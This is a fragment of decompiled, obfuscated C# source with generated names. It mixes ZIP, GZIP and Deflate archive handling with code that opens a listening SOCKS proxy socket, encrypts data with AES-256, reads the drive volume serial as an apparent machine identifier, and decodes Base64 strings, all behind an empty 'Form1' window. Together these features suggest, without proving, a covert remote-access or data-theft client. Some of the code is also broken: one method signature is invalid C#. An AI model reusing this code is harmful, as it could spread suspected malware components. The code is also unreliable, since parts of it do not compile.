				num = (stream6_0.int_8 = (num ^ ((stream6_0.int_12 == 1) ? 1 : 0)));
				stream6_0.int_10++;
				stream6_0.int_6 = num;
				stream6_0.enum11_0 = Stream6.Enum11.const_3;
				Class16.smethod_623(stream6_0.gclass3_0, (byte)num);
				return;
			}
			Class16.smethod_521(stream6_0);
			Class16.smethod_52(stream6_0);
			Class16.smethod_41(stream6_0);
		}

		static int smethod_281(Stream stream_0, GClass3 gclass3_0)
		{
			return Class16.smethod_411(stream_0, gclass3_0, null);
		}

		static EventArgs3 smethod_282(string string_0)
		{
			return new EventArgs3(string_0, Enum6.const_8);
		}

		static int smethod_283(int int_0, int int_1, Class74.Class75 class75_0, byte[] byte_0)
		{
			int num = 0;
			while (true)
			{
				if (class75_0.int_4 != 11)
				{
					int num2 = Class16.smethod_290(int_0, class75_0.class77_0, int_1, byte_0);
					int_1 += num2;
					num += num2;
					int_0 -= num2;
					if (int_0 == 0)
					{
						return num;
					}
				}
				if (!Class16.smethod_175(class75_0))
				{
					if (class75_0.class77_0.int_1 <= 0)
					{
						break;
					}
					if (class75_0.int_4 == 11)
					{
						break;
					}
				}
			}
			return num;
		}

		static void smethod_284(string string_0, string string_1, string string_2, GClass1 gclass1_0, Enum3 enum3_0)
		{
			foreach (GClass0 current in Class16.smethod_506(string_0, string_2, gclass1_0))
			{
				current.Password = gclass1_0.string_3;
				Class16.smethod_189(enum3_0, current, string_1);
			}
		}

		static void smethod_285(Stream7 stream7_0)
		{
			try
			{
				Class16.smethod_589(stream7_0.class33_0);
				stream7_0.uint_0 = (stream7_0.uint_0 << 1 | stream7_0.uint_0 >> 31);
				stream7_0.uint_0 ^= stream7_0.class33_0.method_0();
				Class16.smethod_584(stream7_0);
			}
			finally
			{
				stream7_0.stream_0 = null;
				stream7_0.class33_0 = null;
				stream7_0.class32_0 = null;
			}
		}

		static uint smethod_286(Stream6 stream6_0)
		{
			return (uint)(((Class16.smethod_434(stream6_0, 8) << 8 | Class16.smethod_434(stream6_0, 8)) << 8 | Class16.smethod_434(stream6_0, 8)) << 8 | Class16.smethod_434(stream6_0, 8));
		}

		static string smethod_287(Stream12 stream12_0)
		{
			List<byte> list = new List<byte>();
			bool flag = false;
			while (true)
			{
				int num = stream12_0.stream_0.Read(stream12_0.byte_1, 0, 1);
				if (num != 1)
				{
					break;
				}
				if (stream12_0.byte_1[0] == 0)
				{
					flag = true;
				}
				else
				{
					list.Add(stream12_0.byte_1[0]);
				}
				if (flag)
				{
					goto IL_4C;
				}
			}
			throw new GException0("Unexpected EOF reading GZIP header.");
			IL_4C:
			byte[] array = list.ToArray();
			return Stream10.encoding_0.GetString(array, 0, array.Length);
		}

		static void smethod_288(Form1 form1_0)
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
			form1_0.SuspendLayout();
			form1_0.AutoScaleDimensions = new SizeF(6f, 13f);
			form1_0.AutoScaleMode = AutoScaleMode.Font;
			form1_0.ClientSize = new Size(284, 261);
			form1_0.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			form1_0.Name = "Form1";
			form1_0.Text = "Form1";
			form1_0.Load += new EventHandler(form1_0.method_0);
			form1_0.ResumeLayout(false);
		}

		static GClass0 smethod_289(string string_0, GClass1 gclass1_0, string string_1)
		{
			return Class16.smethod_629(Enum10.const_1, string_1, gclass1_0, string_0);
		}

		static int smethod_290(int int_0, Class74.Class77 class77_0, int int_1, byte[] byte_0)
		{
			int num = class77_0.int_0;
			if (int_0 > class77_0.int_1)
			{
				int_0 = class77_0.int_1;
			}
			else
			{
				num = (class77_0.int_0 - class77_0.int_1 + int_0 & 32767);
			}
			int num2 = int_0;
			int num3 = int_0 - num;
			if (num3 > 0)
			{
				Array.Copy(class77_0.byte_0, 32768 - num3, byte_0, int_1, num3);
				int_1 += num3;
				int_0 = num;
			}
			Array.Copy(class77_0.byte_0, num - int_0, byte_0, int_1, int_0);
			class77_0.int_1 -= num2;
			if (class77_0.int_1 < 0)
			{
				throw new InvalidOperationException();
			}
			return num2;
		}

		static EventArgs2 smethod_291(int int_0, GClass0 gclass0_0, string string_0)
		{
			return new EventArgs2(string_0, Enum6.const_1)
			{
				int_0 = int_0,
				gclass0_0 = gclass0_0
			};
		}

		static void smethod_292(Class54 class54_0, string string_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			class54_0.string_1 = string_0;
		}

		static int smethod_293(Class74.Class77 class77_0, Class74.Class76 class76_0, int int_0)
		{
			int_0 = Math.Min(Math.Min(int_0, 32768 - class77_0.int_1), Class16.smethod_627(class76_0));
			int num = 32768 - class77_0.int_0;
			int num2;
			if (int_0 > num)
			{
				num2 = Class16.smethod_493(class76_0, class77_0.byte_0, class77_0.int_0, num);
				if (num2 == num)
				{
					num2 += Class16.smethod_493(class76_0, class77_0.byte_0, 0, int_0 - num);
				}
			}
			else
			{
				num2 = Class16.smethod_493(class76_0, class77_0.byte_0, class77_0.int_0, int_0);
			}
			class77_0.int_0 = (class77_0.int_0 + num2 & 32767);
			class77_0.int_1 += num2;
			return num2;
		}

		static byte[] smethod_294(bool bool_0, GClass0 gclass0_0)
		{
			List<byte[]> list = new List<byte[]>();
			if (Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_3 || (Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_2 && (!bool_0 || gclass0_0.nullable_1.Value)))
			{
				int num = 4 + (bool_0 ? 28 : 16);
				byte[] array = new byte[num];
				int num2 = 0;
				if (!gclass0_0.bool_13 && !bool_0)
				{
					array[num2++] = 153;
					array[num2++] = 153;
				}
				else
				{
					array[num2++] = 1;
					array[num2++] = 0;
				}
				array[num2++] = (byte)(num - 4);
				array[num2++] = 0;
				Array.Copy(BitConverter.GetBytes(gclass0_0.long_2), 0, array, num2, 8);
				num2 += 8;
				Array.Copy(BitConverter.GetBytes(gclass0_0.long_0), 0, array, num2, 8);
				num2 += 8;
				if (bool_0)
				{
					Array.Copy(BitConverter.GetBytes(gclass0_0.long_4), 0, array, num2, 8);
					num2 += 8;
					Array.Copy(BitConverter.GetBytes(0), 0, array, num2, 4);
				}
				list.Add(array);
			}
			if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
			{
				byte[] array = new byte[11];
				byte[] arg_11E_0 = array;
				int expr_118 = 0;
				int num3 = expr_118 + 1;
				arg_11E_0[expr_118] = 1;
				byte[] arg_12B_0 = array;
				int expr_121 = 1;
				num3 = expr_121 + 1;
				arg_12B_0[expr_121] = 153;
				byte[] arg_134_0 = array;
				int expr_12E = 2;
				num3 = expr_12E + 1;
				arg_134_0[expr_12E] = 7;
				byte[] arg_13D_0 = array;
				int expr_137 = 3;
				num3 = expr_137 + 1;
				arg_13D_0[expr_137] = 0;
				byte[] arg_146_0 = array;
				int expr_140 = 4;
				num3 = expr_140 + 1;
				arg_146_0[expr_140] = 1;
				byte[] arg_14F_0 = array;
				int expr_149 = 5;
				num3 = expr_149 + 1;
				arg_14F_0[expr_149] = 0;
				byte[] arg_159_0 = array;
				int expr_152 = 6;
				num3 = expr_152 + 1;
				arg_159_0[expr_152] = 65;
				byte[] arg_163_0 = array;
				int expr_15C = 7;
				num3 = expr_15C + 1;
				arg_163_0[expr_15C] = 69;
				int num4 = Class16.smethod_176(gclass0_0.enum2_0);
				if (num4 == 128)
				{
					array[num3] = 1;
				}
				else if (num4 == 256)
				{
					array[num3] = 3;
				}
				else
				{
					array[num3] = 255;
				}
				num3++;
				array[num3++] = (byte)(gclass0_0.short_8 & 255);
				array[num3++] = (byte)((int)gclass0_0.short_8 & 65280);
				list.Add(array);
			}
			if (gclass0_0.bool_0 && gclass0_0.bool_1)
			{
				byte[] array = new byte[36];
				byte[] arg_1F9_0 = array;
				int expr_1F3 = 0;
				int arg_1F6_0 = expr_1F3 + 1;
				arg_1F9_0[expr_1F3] = 10;
				byte[] arg_201_0 = array;
				int expr_1FC = 1;
				int arg_1FF_0 = expr_1FC + 1;
				arg_201_0[expr_1FC] = 0;
				byte[] arg_20A_0 = array;
				int expr_204 = 2;
				int arg_207_0 = expr_204 + 1;
				arg_20A_0[expr_204] = 32;
				byte[] arg_212_0 = array;
				int expr_20D = 3;
				int arg_210_0 = expr_20D + 1;
				arg_212_0[expr_20D] = 0;
				byte[] arg_21A_0 = array;
				int expr_215 = 8;
				int arg_218_0 = expr_215 + 1;
				arg_21A_0[expr_215] = 1;
				byte[] arg_223_0 = array;
				int expr_21E = 9;
				int arg_221_0 = expr_21E + 1;
				arg_223_0[expr_21E] = 0;
				byte[] arg_22D_0 = array;
				int expr_227 = 10;
				int arg_22A_0 = expr_227 + 1;
				arg_22D_0[expr_227] = 24;
				byte[] arg_236_0 = array;
				int expr_231 = 11;
				int arg_234_0 = expr_231 + 1;
				arg_236_0[expr_231] = 0;
				long value = gclass0_0.dateTime_1.ToFileTime();
				Array.Copy(BitConverter.GetBytes(value), 0, array, 12, 8);
				value = gclass0_0.dateTime_2.ToFileTime();
				Array.Copy(BitConverter.GetBytes(value), 0, array, 20, 8);
				value = gclass0_0.dateTime_3.ToFileTime();
				Array.Copy(BitConverter.GetBytes(value), 0, array, 28, 8);
				list.Add(array);
			}
			if (gclass0_0.bool_0 && gclass0_0.bool_2)
			{
				int num5 = 9;
				if (!bool_0)
				{
					num5 += 8;
				}
				byte[] array = new byte[num5];
				byte[] arg_2CF_0 = array;
				int expr_2C8 = 0;
				int num6 = expr_2C8 + 1;
				arg_2CF_0[expr_2C8] = 85;
				byte[] arg_2D9_0 = array;
				int expr_2D2 = 1;
				num6 = expr_2D2 + 1;
				arg_2D9_0[expr_2D2] = 84;
				byte[] arg_2E6_0 = array;
				int expr_2DC = 2;
				num6 = expr_2DC + 1;
				arg_2E6_0[expr_2DC] = (byte)(num5 - 4);
				byte[] arg_2EF_0 = array;
				int expr_2E9 = 3;
				num6 = expr_2E9 + 1;
				arg_2EF_0[expr_2E9] = 0;
				byte[] arg_2F8_0 = array;
				int expr_2F2 = 4;
				num6 = expr_2F2 + 1;
				arg_2F8_0[expr_2F2] = 7;
				int value2 = (int)(gclass0_0.dateTime_1 - GClass0.dateTime_4).TotalSeconds;
				Array.Copy(BitConverter.GetBytes(value2), 0, array, 5, 4);
				num6 = 5 + 4;
				if (!bool_0)
				{
					value2 = (int)(gclass0_0.dateTime_2 - GClass0.dateTime_4).TotalSeconds;
					Array.Copy(BitConverter.GetBytes(value2), 0, array, num6, 4);
					num6 += 4;
					value2 = (int)(gclass0_0.dateTime_3 - GClass0.dateTime_4).TotalSeconds;
					Array.Copy(BitConverter.GetBytes(value2), 0, array, num6, 4);
					num6 += 4;
				}
				list.Add(array);
			}
			byte[] array2 = null;
			if (list.Count > 0)
			{
				int num7 = 0;
				int num8 = 0;
				for (int i = 0; i < list.Count; i++)
				{
					num7 += list[i].Length;
				}
				array2 = new byte[num7];
				for (int i = 0; i < list.Count; i++)
				{
					Array.Copy(list[i], 0, array2, num8, list[i].Length);
					num8 += list[i].Length;
				}
			}
			return array2;
		}

		static void smethod_295()
		{
			try
			{
				Class16.smethod_65();
			}
			catch (Exception)
			{
			}
		}

		static int smethod_296(string string_0, Stream stream_0)
		{
			byte[] array = new byte[4];
			int num = stream_0.Read(array, 0, array.Length);
			if (num != array.Length)
			{
				throw new BadReadException(string.Format(string_0, stream_0.Position));
			}
			return (((int)array[3] * 256 + (int)array[2]) * 256 + (int)array[1]) * 256 + (int)array[0];
		}

		static bool smethod_297(Class44 class44_0)
		{
			return class44_0.bool_0;
		}

		static GClass0 smethod_298(string string_0, GClass1 gclass1_0, string string_1)
		{
			return Class16.smethod_554(Encoding.Default, string_0, gclass1_0, string_1);
		}

		static int smethod_299(Class32 class32_0)
		{
			return class32_0.int_0;
		}

		static uint smethod_300(Stream stream_0)
		{
			return (uint)Class16.smethod_89(stream_0);
		}

		static void smethod_301(Class64 class64_0)
		{
			try
			{
				Class16.smethod_215(class64_0, new Socket(Class16.smethod_250(class64_0).AddressFamily, SocketType.Stream, ProtocolType.Tcp));
				Class16.smethod_541(class64_0).Bind(new IPEndPoint(Class16.smethod_250(class64_0), Class16.smethod_53(class64_0)));
				Class16.smethod_541(class64_0).Listen(50);
				Class16.smethod_541(class64_0).BeginAccept(new AsyncCallback(class64_0.vmethod_0), Class16.smethod_541(class64_0));
			}
			catch
			{
				Class16.smethod_215(class64_0, null);
				throw new SocketException();
			}
		}

		static EventArgs3 smethod_302(long long_0, string string_0, long long_1, GClass0 gclass0_0)
		{
			return new EventArgs3(string_0, Enum6.const_16)
			{
				string_0 = string_0,
				gclass0_0 = gclass0_0,
				long_0 = long_1,
				long_1 = long_0
			};
		}

		static Class66 smethod_303(bool bool_0, Class82 class82_0 = true, Class84 class84_0)
		{
			Class82.Class83 @class = new Class82.Class83();
			@class.class84_0 = class84_0;
			object object_ = Class82.object_0;
			Class66 result;
			lock (object_)
			{
				Class82.bool_0 = bool_0;
				if (Class82.list_0 == null)
				{
					Class82.list_0 = new List<Class66>();
				}
				Class66 class2 = Class82.list_0.Where(new Func<Class66, bool>(@class.method_0)).FirstOrDefault<Class66>();
				if (class2 == null)
				{
					class2 = new Class66(@class.class84_0);
					Class16.smethod_301(class2);
					Class82.list_0.Add(class2);
				}
				if (class2.method_3() != @class.class84_0.method_8())
				{
					throw new Exception("Socks Version Mismatch for Port " + @class.class84_0.method_0());
				}
				result = class2;
			}
			return result;
		}

		static string smethod_304(GClass0 gclass0_0)
		{
			string text = gclass0_0.string_1.Replace("\\", "/");
			string result;
			if (gclass0_0.bool_3 && gclass0_0.string_1.Length >= 3 && gclass0_0.string_1[1] == ':' && text[2] == '/')
			{
				result = text.Substring(3);
			}
			else if (gclass0_0.string_1.Length >= 4 && text[0] == '/' && text[1] == '/')
			{
				int num = text.IndexOf('/', 2);
				if (num == -1)
				{
					throw new ArgumentException("The path for that entry appears to be badly formatted");
				}
				result = text.Substring(num + 1);
			}
			else if (gclass0_0.string_1.Length >= 3 && text[0] == '.' && text[1] == '/')
			{
				result = text.Substring(2);
			}
			else
			{
				result = text;
			}
			return result;
		}

		static Enum25 smethod_305(Class54 class54_0)
		{
			return class54_0.enum25_0;
		}

		static void smethod_306(Class39 class39_0)
		{
			for (int i = 0; i < Class49.int_5; i++)
			{
				class39_0.short_2[i * 2] = 0;
			}
			for (int j = 0; j < Class49.int_2; j++)
			{
				class39_0.short_3[j * 2] = 0;
			}
			for (int k = 0; k < Class49.int_1; k++)
			{
				class39_0.short_4[k * 2] = 0;
			}
			class39_0.short_2[Class39.int_18 * 2] = 1;
			class39_0.int_48 = 0;
			class39_0.int_47 = 0;
			class39_0.int_49 = 0;
			class39_0.int_45 = 0;
		}

		static int smethod_307(Stream10 stream10_0)
		{
			byte[] array = (stream10_0.string_1 == null) ? null : Stream10.encoding_0.GetBytes(stream10_0.string_1);
			byte[] array2 = (stream10_0.string_0 == null) ? null : Stream10.encoding_0.GetBytes(stream10_0.string_0);
			int num = (stream10_0.string_1 == null) ? 0 : (array.Length + 1);
			int num2 = (stream10_0.string_0 == null) ? 0 : (array2.Length + 1);
			int num3 = 10 + num + num2;
			byte[] array3 = new byte[num3];
			byte[] arg_78_0 = array3;
			int expr_71 = 0;
			int num4 = expr_71 + 1;
			arg_78_0[expr_71] = 31;
			byte[] arg_86_0 = array3;
			int expr_7C = 1;
			num4 = expr_7C + 1;
			arg_86_0[expr_7C] = 139;
			byte[] arg_90_0 = array3;
			int expr_8A = 2;
			num4 = expr_8A + 1;
			arg_90_0[expr_8A] = 8;
			byte b = 0;
			if (stream10_0.string_1 != null)
			{
				b ^= 16;
			}
			if (stream10_0.string_0 != null)
			{
				b ^= 8;
			}
			array3[num4++] = b;
			if (!stream10_0.nullable_0.HasValue)
			{
				stream10_0.nullable_0 = new DateTime?(DateTime.Now);
			}
			int value = (int)(stream10_0.nullable_0.Value - Stream10.dateTime_0).TotalSeconds;
			Array.Copy(BitConverter.GetBytes(value), 0, array3, num4, 4);
			num4 += 4;
			array3[num4++] = 0;
			array3[num4++] = 255;
			if (num2 != 0)
			{
				Array.Copy(array2, 0, array3, num4, num2 - 1);
				num4 += num2 - 1;
				array3[num4++] = 0;
			}
			if (num != 0)
			{
				Array.Copy(array, 0, array3, num4, num - 1);
				num4 += num - 1;
				array3[num4++] = 0;
			}
			stream10_0.stream12_0.stream_0.Write(array3, 0, array3.Length);
			return array3.Length;
		}

		static void smethod_308(GClass1 gclass1_0, Enum6 enum6_0)
		{
			EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
			if (eventHandler_ != null)
			{
				EventArgs3 eventArgs = new EventArgs3(gclass1_0.ArchiveNameForEvent, enum6_0);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_8 = true;
				}
			}
		}

		static byte[] smethod_309(byte[] byte_0, Form1 form1_0, byte[] byte_1)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, form1_0.byte_1, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(byte_1, 0, byte_1.Length);
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		static void smethod_310(Class45 class45_0, int int_0)
		{
			if (class45_0.int_6 == null)
			{
				class45_0.int_6 = new int[1];
				class45_0.int_7 = new int[int_0];
				class45_0.int_8 = new int[16];
				class45_0.int_9 = new int[3];
				class45_0.int_10 = new int[15];
				class45_0.int_11 = new int[16];
				return;
			}
			if (class45_0.int_7.Length < int_0)
			{
				class45_0.int_7 = new int[int_0];
			}
			Array.Clear(class45_0.int_7, 0, int_0);
			Array.Clear(class45_0.int_8, 0, 16);
			class45_0.int_9[0] = 0;
			class45_0.int_9[1] = 0;
			class45_0.int_9[2] = 0;
			Array.Clear(class45_0.int_10, 0, 15);
			Array.Clear(class45_0.int_11, 0, 16);
		}

		static Class22 smethod_311(string string_0)
		{
			Class22 @class = new Class22();
			if (string_0 == null)
			{
				throw new BadPasswordException("This entry requires a password.");
			}
			Class16.smethod_377(@class, string_0);
			return @class;
		}

		static void smethod_312(Stream3 stream3_0, byte[] byte_0, int int_0, int int_1)
		{
			for (int i = 0; i < int_1; i++)
			{
				byte_0[int_0 + i] = (stream3_0.byte_1[i] ^ byte_0[int_0 + i]);
			}
		}

		static bool smethod_313(EventArgs0 eventArgs0_0)
		{
			return eventArgs0_0.bool_0;
		}

		static void smethod_314(Class53 class53_0, Class54 class54_0)
		{
			class54_0.class53_0 = class53_0;
		}

		static int smethod_315(ushort ushort_0, int int_0, byte[] byte_0)
		{
			int num = int_0;
			while (num + 3 < byte_0.Length)
			{
				ushort num2 = (ushort)((int)byte_0[num++] + (int)byte_0[num++] * 256);
				if (num2 == ushort_0)
				{
					return num - 2;
				}
				short num3 = (short)((int)byte_0[num++] + (int)byte_0[num++] * 256);
				num += (int)num3;
			}
			return -1;
		}

		static void smethod_316(Class39 class39_0)
		{
			class39_0.int_26 = 2 * class39_0.int_23;
			Array.Clear(class39_0.short_1, 0, class39_0.int_28);
			class39_0.class40_0 = Class16.smethod_611(class39_0.enum20_0);
			Class16.smethod_645(class39_0);
			class39_0.int_36 = 0;
			class39_0.int_32 = 0;
			class39_0.int_38 = 0;
			class39_0.int_33 = (class39_0.int_39 = Class39.int_14 - 1);
			class39_0.int_35 = 0;
			class39_0.int_27 = 0;
		}

		static bool smethod_317(int int_0)
		{
			return int_0 != 33639248;
		}

		static int smethod_318(Class20 class20_0)
		{
			return class20_0.int_0 / 8 / 2 + 10 + 2;
		}

		static string smethod_319(string string_0)
		{
			return Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
		}

		static void smethod_320(GClass2 gclass2_0)
		{
			if (gclass2_0.class39_0 == null)
			{
				throw new GException0("No Deflate State!");
			}
			Class16.smethod_406(gclass2_0.class39_0);
		}

		static void smethod_321(Class58 class58_0, byte[] byte_0)
		{
			class58_0.byte_0 = byte_0;
		}

		static int smethod_322(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.int_2;
			}
			return class8_0.stream0_0.int_1;
		}

		static void smethod_323(GClass0 gclass0_0)
		{
			gclass0_0.long_4 = gclass0_0.long_5;
		}

		static DateTime smethod_324(int int_0)
		{
			if (int_0 == 65535 || int_0 == 0)
			{
				return new DateTime(1995, 1, 1, 0, 0, 0, 0);
			}
			short num = (short)(int_0 & 65535);
			short num2 = (short)(((long)int_0 & (long)((ulong)-65536)) >> 16);
			int i = 1980 + (((int)num2 & 65024) >> 9);
			int j = (num2 & 480) >> 5;
			int k = (int)(num2 & 31);
			int num3 = ((int)num & 63488) >> 11;
			int l = (num & 2016) >> 5;
			int m = (int)((num & 31) * 2);
			if (m >= 60)
			{
				l++;
				m = 0;
			}
			if (l >= 60)
			{
				num3++;
				l = 0;
			}
			if (num3 >= 24)
			{
				k++;
				num3 = 0;
			}
			DateTime dateTime = DateTime.Now;
			bool flag = false;
			try
			{
				dateTime = new DateTime(i, j, k, num3, l, m, 0);
				flag = true;
			}
			catch (ArgumentOutOfRangeException)
			{
				if (i == 1980)
				{
					if (j != 0)
					{
						if (k != 0)
						{
							goto IL_106;
						}
					}
					try
					{
						dateTime = new DateTime(1980, 1, 1, num3, l, m, 0);
						flag = true;
						goto IL_1A3;
					}
					catch (ArgumentOutOfRangeException)
					{
						try
						{
							dateTime = new DateTime(1980, 1, 1, 0, 0, 0, 0);
							flag = true;
						}
						catch (ArgumentOutOfRangeException)
						{
						}
						goto IL_1A3;
					}
				}
				try
				{
					IL_106:
					while (i < 1980)
					{
						i++;
					}
					while (i > 2030)
					{
						i--;
					}
					while (j < 1)
					{
						j++;
					}
					while (j > 12)
					{
						j--;
					}
					while (k < 1)
					{
						k++;
					}
					while (k > 28)
					{
						k--;
					}
					while (l < 0)
					{
						l++;
					}
					while (l > 59)
					{
						l--;
					}
					while (m < 0)
					{
						m++;
					}
					while (m > 59)
					{
						m--;
					}
					dateTime = new DateTime(i, j, k, num3, l, m, 0);
					flag = true;
				}
				catch (ArgumentOutOfRangeException)
				{
				}
				IL_1A3:;
			}
			if (!flag)
			{
				string arg = string.Format("y({0}) m({1}) d({2}) h({3}) m({4}) s({5})", new object[]
				{
					i,
					j,
					k,
					num3,
					l,
					m
				});
				throw new ZipException(string.Format("Bad date/time format in the zip file. ({0})", arg));
			}
			dateTime = DateTime.SpecifyKind(dateTime, DateTimeKind.Local);
			return dateTime;
		}

		static string smethod_325(string string_0)
		{
			if (string_0 == "")
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				for (int i = 0; i < drives.Length; i++)
				{
					DriveInfo driveInfo = drives[i];
					if (driveInfo.IsReady)
					{
						string_0 = driveInfo.RootDirectory.ToString();
						break;
					}
				}
			}
			if (string_0.EndsWith(":\\"))
			{
				string_0 = string_0.Substring(0, string_0.Length - 2);
			}
			ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + string_0 + ":\"");
			managementObject.Get();
			string result = managementObject["VolumeSerialNumber"].ToString();
			managementObject.Dispose();
			return result;
		}

		[DllImport("kernel32.dll")]
		static extern IntPtr GetModuleHandle(string string_0);

		static GClass0 smethod_326(string string_0, Stream stream_0)
		{
			return Class16.smethod_381(stream_0, string_0, Enum0.const_2, null);
		}

		static string smethod_327(string string_0, string string_1)
		{
			string name = Assembly.GetExecutingAssembly().GetName().Name;
			string text2;
			do
			{
				string text = Guid.NewGuid().ToString();
				string path = string.Format("{0}-{1}-{2}.{3}", new object[]
				{
					name,
					DateTime.Now.ToString("yyyyMMMdd-HHmmss"),
					text,
					string_0
				});
				text2 = Path.Combine(string_1, path);
			}
			while (File.Exists(text2) || Directory.Exists(text2));
			return text2;
		}

		static void smethod_328(Stream8 stream8_0, bool bool_0)
		{
			if (stream8_0.bool_2)
			{
				return;
			}
			if (stream8_0.int_5 >= 0)
			{
				Class37 object_ = stream8_0.list_0[stream8_0.int_5];
				stream8_0.method_0(object_);
				stream8_0.int_5 = -1;
			}
			if (bool_0)
			{
				Class16.smethod_602(stream8_0, true, false);
				Class16.smethod_639(stream8_0);
				return;
			}
			Class16.smethod_602(stream8_0, false, false);
		}

		static void smethod_329(string string_0, Class13 class13_0)
		{
			if (string_0.Length != 1 || (string_0[0] != 'D' && string_0[0] != 'F'))
			{
				throw new ArgumentException("Specify a single character: either D or F");
			}
			class13_0.char_0 = string_0[0];
		}

		static long smethod_330(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.long_2;
			}
			return class8_0.stream0_0.long_0;
		}

		static void smethod_331(Class8 class8_0, Stream11 stream11_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				class8_0.gclass1_0.stream11_0 = stream11_0;
				return;
			}
			if (class8_0.stream0_0 != null)
			{
				class8_0.stream0_0.stream11_0 = stream11_0;
			}
		}

		static void smethod_332(Stream stream_0, GClass0 gclass0_0)
		{
			byte[] array = new byte[gclass0_0.BufferSize];
			Stream4 stream = new Stream4(gclass0_0.ArchiveStream);
			long long_ = gclass0_0.long_4;
			int lengthOfHeader = gclass0_0.LengthOfHeader;
			Class16.smethod_135(gclass0_0, stream_0, 0);
			Class16.smethod_323(gclass0_0);
			if (!gclass0_0.string_1.EndsWith("/"))
			{
				long num = long_ + (long)lengthOfHeader;
				int num2 = Class16.smethod_543(gclass0_0.enum2_1);
				num -= (long)num2;
				gclass0_0.int_3 += num2;
				stream.Seek(num, SeekOrigin.Begin);
				long num3 = gclass0_0.long_0;
				while (num3 > 0L)
				{
					num2 = ((num3 > (long)array.Length) ? array.Length : ((int)num3));
					int num4 = stream.Read(array, 0, num2);
					stream_0.Write(array, 0, num4);
					num3 -= (long)num4;
					long long_2 = stream.long_1;
					long long_3 = gclass0_0.long_0;
					Class16.smethod_242(long_2, long_3, gclass0_0);
					if (gclass0_0.bool_12)
					{
						break;
					}
				}
				if ((gclass0_0.short_7 & 8) == 8)
				{
					int num5 = 16;
					if (gclass0_0.bool_10)
					{
						num5 += 8;
					}
					byte[] buffer = new byte[num5];
					stream.Read(buffer, 0, num5);
					if (gclass0_0.bool_10 && Class16.smethod_429(gclass0_0.class8_0) == Enum8.const_0)
					{
						stream_0.Write(buffer, 0, 8);
						if (gclass0_0.long_0 > (long)((ulong)-1))
						{
							throw new InvalidOperationException("ZIP64 is required");
						}
						stream_0.Write(buffer, 8, 4);
						if (gclass0_0.long_2 > (long)((ulong)-1))
						{
							throw new InvalidOperationException("ZIP64 is required");
						}
						stream_0.Write(buffer, 16, 4);
						gclass0_0.int_4 -= 8;
					}
					else if (!gclass0_0.bool_10 && Class16.smethod_429(gclass0_0.class8_0) == Enum8.const_3)
					{
						byte[] buffer2 = new byte[4];
						stream_0.Write(buffer, 0, 8);
						stream_0.Write(buffer, 8, 4);
						stream_0.Write(buffer2, 0, 4);
						stream_0.Write(buffer, 12, 4);
						stream_0.Write(buffer2, 0, 4);
						gclass0_0.int_4 += 8;
					}
					else
					{
						stream_0.Write(buffer, 0, num5);
					}
				}
			}
			gclass0_0.long_6 = (long)gclass0_0.int_3 + gclass0_0.long_1 + (long)gclass0_0.int_4;
		}

		static string smethod_333(Class62 class62_0)
		{
			string text = string.Concat(new string[]
			{
				Class16.smethod_604(class62_0),
				" ",
				Class16.smethod_208(class62_0),
				" ",
				Class16.smethod_674(class62_0),
				"\r\n"
			});
			if (Class16.smethod_465(class62_0) != null)
			{
				foreach (string text2 in Class16.smethod_465(class62_0).Keys)
				{
					if (text2.Length < 6 || !text2.Substring(0, 6).Equals("proxy-"))
					{
						text = string.Concat(new string[]
						{
							text,
							CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text2),
							": ",
							Class16.smethod_465(class62_0)[text2],
							"\r\n"
						});
					}
				}
				text += "\r\n";
				if (class62_0.string_4 != null)
				{
					text += class62_0.string_4;
				}
			}
			return text;
		}

		static Exception smethod_334(Class54 class54_0)
		{
			return class54_0.exception_0;
		}

		static string smethod_335()
		{
			return Class16.smethod_432();
		}

		static byte smethod_336(Class22 class22_0)
		{
			ushort num = (ushort)(class22_0.uint_0[2] & 65535u) | 2;
			return (byte)(num * (num ^ 1) >> 8);
		}

		static void smethod_337(GClass0 gclass0_0)
		{
			gclass0_0.nullable_1 = new bool?(gclass0_0.long_0 >= (long)((ulong)-1) || gclass0_0.long_2 >= (long)((ulong)-1) || gclass0_0.long_4 >= (long)((ulong)-1));
			if (Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_0 && gclass0_0.nullable_1.Value)
			{
				throw new ZipException("Compressed or Uncompressed size, or offset exceeds the maximum value. Consider setting the UseZip64WhenSaving property on the ZipFile instance.");
			}
			gclass0_0.nullable_2 = new bool?(Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_3 || gclass0_0.nullable_1.Value);
		}

		static void smethod_338(Class39 class39_0, int int_0, short[] short_0)
		{
			int num = int_0 * 2;
			Class16.smethod_371(class39_0, (int)short_0[num] & 65535, (int)short_0[num + 1] & 65535);
		}

		static int smethod_339(GClass2 gclass2_0)
		{
			return Class16.smethod_534(true, gclass2_0);
		}

		static void smethod_340(EventArgs0 eventArgs0_0, long long_0)
		{
